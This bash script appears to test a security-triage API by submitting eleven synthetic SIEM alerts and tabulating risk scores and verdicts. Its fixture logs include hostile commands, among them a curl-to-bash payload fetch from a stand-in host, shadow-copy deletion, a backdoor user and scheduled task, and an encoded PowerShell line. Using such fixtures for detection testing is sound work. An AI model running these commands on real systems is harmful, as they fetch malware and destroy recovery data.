#!/bin/bash
# Test all 11 templates with realistic SIEM data
set -e

API="http://localhost:8090"
TKN=$(curl -s -X POST $API/api/v1/auth/login -H "Content-Type: application/json" \
  -d '{"email":"admin@test.local","password":"TestPass2026"}' | sed 's/.*"token":"\([^"]*\)".*/\1/')

echo "Token: ${TKN:0:20}..."

submit() {
  local name=$1
  local data=$2
  RESP=$(curl -s -X POST $API/api/v1/tasks \
    -H "Authorization: Bearer $TKN" -H "Content-Type: application/json" -d "$data")
  TID=$(echo "$RESP" | sed 's/.*"task_id":"\([^"]*\)".*/\1/')
  echo "$name: $TID"
}

TASKS=()

# 1. Phishing
submit "phishing" '{"task_type":"phishing_investigation","input":{"prompt":"Phishing email analysis","severity":"high","siem_event":{"title":"Suspicious email","source_ip":"45.33.32.156","destination_ip":"10.0.1.50","hostname":"MAIL-GW-01","username":"jsmith","rule_name":"PhishDetect","raw_log":"From: security@micros0ft-update.xyz\nReply-To: attacker@gmail.com\nSubject: Urgent: Your account will be suspended\nClick here immediately to verify: https://micros0ft-update.xyz/login.php?token=abc123\nAttachment: invoice.pdf.exe\nYour account expires within 24 hours. Act now."}}}'
TASKS+=("$TID")
sleep 2

# 2. Ransomware
submit "ransomware" '{"task_type":"ransomware_triage","input":{"prompt":"Ransomware alert","severity":"critical","siem_event":{"title":"Ransomware detected","source_ip":"192.168.1.15","destination_ip":"10.0.0.50","hostname":"SRV-FILE-01","username":"svc-backup","rule_name":"RansomwareDetect","raw_log":"2026-03-22T10:00:00Z SRV-FILE-01 vssadmin.exe delete shadows /all /quiet\n2026-03-22T10:00:05Z SRV-FILE-01 FileRename: C:\\Docs\\Report.xlsx -> C:\\Docs\\Report.xlsx.encrypted\n2026-03-22T10:00:05Z SRV-FILE-01 FileRename: C:\\Docs\\Budget.pdf -> C:\\Docs\\Budget.pdf.locked\n2026-03-22T10:00:06Z SRV-FILE-01 FileRename: C:\\HR\\Employees.csv -> C:\\HR\\Employees.csv.encrypted\n2026-03-22T10:00:07Z SRV-FILE-01 NetworkConnect: 192.168.1.15:445 -> 10.0.0.50:445\n2026-03-22T10:00:08Z SRV-FILE-01 FileCreate: C:\\Docs\\README_DECRYPT.txt\nbcdedit /set recoveryenabled no"}}}'
TASKS+=("$TID")
sleep 2

# 3. Data exfil
submit "data_exfil" '{"task_type":"data_exfiltration_detection","input":{"prompt":"Data exfiltration alert","severity":"high","siem_event":{"title":"Large outbound transfer","source_ip":"10.0.1.25","destination_ip":"104.16.85.20","hostname":"WS-FINANCE-03","username":"mthompson","rule_name":"DLP-Alert","raw_log":"2026-03-22T02:30:00Z WS-FINANCE-03 POST https://mega.nz/upload Content-Length: 524288000\n2026-03-22T02:30:15Z DLP: 500 MB upload to mega.nz by mthompson\n2026-03-22T02:28:00Z WS-FINANCE-03 7z.exe a C:\\temp\\export.7z C:\\Finance\\*.xlsx C:\\Finance\\*.csv\nContent-Encoding: gzip\nFiles: customer_database.csv, financial_statements.xlsx, employee_records.csv"}}}'
TASKS+=("$TID")
sleep 2

# 4. Privesc
submit "privesc" '{"task_type":"privilege_escalation_hunt","input":{"prompt":"Privilege escalation alert","severity":"high","siem_event":{"title":"Unexpected sudo","source_ip":"10.0.2.15","destination_ip":"10.0.2.1","hostname":"WEB-PROD-01","username":"www-data","rule_name":"PrivEsc","raw_log":"sudo: www-data : COMMAND=/bin/bash\nsudo: www-data : COMMAND=/usr/bin/passwd root\nsudo: www-data : COMMAND=/usr/sbin/useradd backdoor -m -s /bin/bash\nfind / -perm -4000 -type f 2>/dev/null\nchmod u+s /tmp/exploit\nCVE-2024-1086 exploit detected"}}}'
TASKS+=("$TID")
sleep 2

# 5. C2
submit "c2" '{"task_type":"c2_communication_hunt","input":{"prompt":"C2 communication alert","severity":"critical","siem_event":{"title":"Periodic HTTPS callbacks","source_ip":"10.0.1.100","destination_ip":"185.220.101.34","hostname":"WS-EXEC-07","username":"cjohnson","rule_name":"C2-Beacon","raw_log":"10:00:00 WS-EXEC-07 HTTPS -> 185.220.101.34:443 size=1024\n10:01:00 WS-EXEC-07 HTTPS -> 185.220.101.34:443 size=1028\n10:02:01 WS-EXEC-07 HTTPS -> 185.220.101.34:443 size=1024\n10:03:00 WS-EXEC-07 HTTPS -> 185.220.101.34:443 size=1030\n10:04:00 WS-EXEC-07 HTTPS -> 185.220.101.34:443 size=1024\n10:05:01 WS-EXEC-07 HTTPS -> 185.220.101.34:443 size=1026\nDNS query: cmd-7f3a9b2c.evil-c2.xyz\npowershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQ=="}}}'
TASKS+=("$TID")
sleep 2

# 6. Brute force
submit "brute_force" '{"task_type":"brute_force_investigation","input":{"prompt":"SSH brute force attack","severity":"high","siem_event":{"title":"SSH brute force","source_ip":"45.33.32.156","destination_ip":"10.0.0.5","hostname":"DC-01","username":"root","rule_name":"BruteForce","raw_log":"Mar 22 07:10:01 DC-01 sshd[12345]: Failed password for root from 45.33.32.156 port 44832 ssh2\nMar 22 07:10:02 DC-01 sshd[12346]: Failed password for admin from 45.33.32.156 port 44833 ssh2\nMar 22 07:10:03 DC-01 sshd[12347]: Failed password for root from 45.33.32.156 port 44834 ssh2\nMar 22 07:10:04 DC-01 sshd[12348]: Failed password for postgres from 45.33.32.156 port 44835 ssh2\nMar 22 07:10:05 DC-01 sshd[12349]: Failed password for root from 45.33.32.156 port 44836 ssh2\nMar 22 07:10:06 DC-01 sshd[12350]: Failed password for oracle from 45.33.32.156 port 44837 ssh2\nMar 22 07:10:07 DC-01 sshd[12351]: Failed password for mysql from 45.33.32.156 port 44838 ssh2\nMar 22 07:10:08 DC-01 sshd[12352]: Accepted password for root from 45.33.32.156 port 44839 ssh2"}}}'
TASKS+=("$TID")
sleep 2

# 7. Insider threat
submit "insider" '{"task_type":"insider_threat_detection","input":{"prompt":"Insider threat alert","severity":"high","siem_event":{"title":"Bulk data download","source_ip":"10.0.3.50","destination_ip":"10.0.0.10","hostname":"WS-HR-01","username":"jdoe","rule_name":"InsiderThreat","raw_log":"2026-03-22T03:15:00Z Saturday WS-HR-01 jdoe SELECT * FROM customer_database\n2026-03-22T03:16:00Z WS-HR-01 DLP: 2500 records exported to customer_export.csv\n2026-03-22T03:17:00Z WS-HR-01 jdoe accessed payroll database\n2026-03-22T03:18:00Z WS-HR-01 7z.exe archive created: employee_records.zip (150 MB)\n2026-03-22T03:19:00Z WS-HR-01 Upload to https://drive.google.com/upload\nHR note: jdoe submitted resignation notice last week"}}}'
TASKS+=("$TID")
sleep 2

# 8. Lateral movement
submit "lateral" '{"task_type":"lateral_movement_detection","input":{"prompt":"Lateral movement alert","severity":"critical","siem_event":{"title":"PSExec from workstation","source_ip":"10.0.1.25","destination_ip":"10.0.0.5","hostname":"WS-ADMIN-01","username":"admin_svc","rule_name":"LateralMove","raw_log":"2026-03-22T14:00:00Z WS-ADMIN-01 PsExec.exe \\\\10.0.0.5 -u admin_svc cmd.exe\n2026-03-22T14:00:05Z ADMIN$ share accessed on 10.0.0.5\n2026-03-22T14:01:00Z WMI Process Create on 10.0.0.10 from 10.0.0.5\n2026-03-22T14:02:00Z schtasks /create /s 10.0.0.15 /tn backdoor /tr C:\\temp\\payload.exe\nLogonType: 9 (NewCredentials)\nNTLM pass-the-hash detected from 10.0.1.25 to 10.0.0.5\nC$ share accessed on 10.0.0.10, 10.0.0.15, 10.0.0.20"}}}'
TASKS+=("$TID")
sleep 2

# 9. Network beaconing
submit "beaconing" '{"task_type":"network_beaconing","input":{"prompt":"Network beaconing alert","severity":"high","siem_event":{"title":"Periodic DNS to rare domain","source_ip":"10.0.1.75","destination_ip":"198.51.100.50","hostname":"WS-DEV-02","username":"developer1","rule_name":"Beacon","raw_log":"10:00:00 WS-DEV-02 DNS query: a7f3b9c2e1d4.beacon-master.xyz\n10:01:00 WS-DEV-02 DNS query: b8e4c1d3f2a5.beacon-master.xyz\n10:02:01 WS-DEV-02 DNS query: c9d5e2f4a3b6.beacon-master.xyz\n10:03:00 WS-DEV-02 DNS query: d0f6a3b5c4e7.beacon-master.xyz\n10:04:00 WS-DEV-02 HTTPS -> 198.51.100.50:8443 size=512\n10:05:01 WS-DEV-02 DNS query: e1a7b4c6d5f8.beacon-master.xyz\n10:06:00 WS-DEV-02 HTTPS -> 198.51.100.50:8443 size=508"}}}'
TASKS+=("$TID")
sleep 2

# 10. Cloud
submit "cloud" '{"task_type":"cloud_infrastructure_attack","input":{"prompt":"Cloud infrastructure alert","severity":"critical","siem_event":{"title":"IAM admin role created","source_ip":"203.0.113.50","destination_ip":"10.0.0.1","hostname":"AWS-CONSOLE","username":"compromised-dev","rule_name":"CloudAttack","raw_log":"2026-03-22T09:00:00Z AWS CloudTrail: CreateRole AdminBackdoor by compromised-dev from 203.0.113.50\n2026-03-22T09:00:05Z AttachRolePolicy AdministratorAccess to AdminBackdoor\n2026-03-22T09:01:00Z CreateAccessKey for AdminBackdoor AKIAIOSFODNN7EXAMPLE\n2026-03-22T09:02:00Z RunInstances: 20 x c5.4xlarge in eu-west-1, ap-southeast-1, us-west-2\n2026-03-22T09:03:00Z StopLogging on CloudTrail main-trail\n2026-03-22T09:04:00Z AuthorizeSecurityGroupIngress: 0.0.0.0/0 port 22"}}}'
TASKS+=("$TID")
sleep 2

# 11. Supply chain
submit "supply_chain" '{"task_type":"supply_chain_compromise","input":{"prompt":"Supply chain alert","severity":"high","siem_event":{"title":"Package hash mismatch","source_ip":"10.0.5.10","destination_ip":"10.0.0.1","hostname":"BUILD-SERVER-01","username":"jenkins","rule_name":"SupplyChain","raw_log":"2026-03-22T08:00:00Z BUILD-SERVER-01 npm install: hash mismatch for lodash@4.17.21\nExpected SHA256: abc123def456\nReceived SHA256: 789ghi012jkl\n2026-03-22T08:00:05Z postinstall script executed: curl https://evil-pkg.top/payload.sh | bash\n2026-03-22T08:00:10Z GPG signature invalid for package colors@1.4.1\n2026-03-22T08:00:15Z Unexpected version: event-stream@4.0.0-rc.1 (yanked version)\nGithub Actions workflow .github/workflows/deploy.yml modified by unknown contributor"}}}'
TASKS+=("$TID")

echo ""
echo "All 11 submitted. Waiting 120s for completion..."
sleep 120

# Re-auth (JWT might expire)
TKN=$(curl -s -X POST $API/api/v1/auth/login -H "Content-Type: application/json" \
  -d '{"email":"admin@test.local","password":"TestPass2026"}' | sed 's/.*"token":"\([^"]*\)".*/\1/')

echo ""
echo "| # | Template | Status | Risk | Findings | IOCs | Verdict | MITRE | Time |"
echo "|---|----------|--------|------|----------|------|---------|-------|------|"

IDX=0
for TID in "${TASKS[@]}"; do
  IDX=$((IDX + 1))
  R=$(curl -s "$API/api/v1/tasks/$TID" -H "Authorization: Bearer $TKN")
  STATUS=$(echo "$R" | sed -n 's/.*"status":"\([^"]*\)".*/\1/p' | head -1)
  RISK=$(echo "$R" | sed -n 's/.*"risk_score":\([0-9]*\).*/\1/p' | head -1)
  VERDICT=$(echo "$R" | sed -n 's/.*"verdict":"\([^"]*\)".*/\1/p' | head -1)
  TASK_TYPE=$(echo "$R" | sed -n 's/.*"task_type":"\([^"]*\)".*/\1/p' | head -1)
  EXEC_MS=$(echo "$R" | sed -n 's/.*"execution_ms":\([0-9]*\).*/\1/p' | head -1)
  # Count findings and IOCs (rough)
  FINDINGS_COUNT=$(echo "$R" | grep -o '"title":' | wc -l)
  IOC_COUNT=$(echo "$R" | grep -o '"confidence":' | wc -l)
  HAS_MITRE=$(echo "$R" | grep -c "mitre_attack" || true)
  echo "| $IDX | $TASK_TYPE | $STATUS | $RISK | $FINDINGS_COUNT | $IOC_COUNT | $VERDICT | ${HAS_MITRE:+yes} | ${EXEC_MS}ms |"
done
